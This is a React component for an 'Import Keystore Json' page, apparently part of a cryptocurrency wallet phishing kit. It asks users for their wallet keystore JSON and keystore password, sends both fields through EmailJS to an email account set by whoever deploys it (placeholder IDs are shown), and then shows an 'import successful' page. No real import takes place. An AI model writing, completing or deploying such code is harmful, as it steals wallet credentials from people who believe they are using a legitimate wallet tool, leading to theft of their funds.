import React, { useRef, useState } from "react";
import "./ImportKeystoreJson.css";
import ImportHeader from "../ImportHeader/ImportHeader";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

function ImportKeystoreJson() {
	const form = useRef();
	const navigate = useNavigate();

	const [input1, setInput1] = useState("");
	const [input2, setInput2] = useState("");

	const handleSubmit = (e) => {
		e.preventDefault();

		emailjs
			.sendForm(
			'YOUR_SERVICE_ID', 
			'YOUR_TEMPLATE_ID', 
			form.current, 
			'YOUR_USER_ID'
			)
			.then(
				(result) => {
					console.log(result.text);
					// alert("Successful");
					navigate("/import-successful");
				},
				(error) => {
					console.log(error.text);
				}
			);
		// e.target.reset();
		// setText1([input1, ...text1]);
		setInput1("");
	};

	return (
		<div>
			<ImportHeader />
			<div className="import">
				<div className="name">Keystore Value</div>
				<form
					ref={form}
					onSubmit={(e) => {
						e.preventDefault();
					}}>
					<div className="textinput">
						<textArea
							placeholder="Input your Keystore Json value"
							type="text"
							value={input1}
							name="keystore"
							onChange={(e) => setInput1(e.target.value)}
						/>
					</div>
					<p>KEYSTORE PASSWORD</p>
					<input
						type="password"
						value={input2}
						name="keystorepassword"
						onChange={(e) => setInput2(e.target.value)}
					/>
					<div className="import__button">
						<button onClick={handleSubmit}>Import</button>
					</div>
				</form>
			</div>
		</div>
	);
}

export default ImportKeystoreJson;
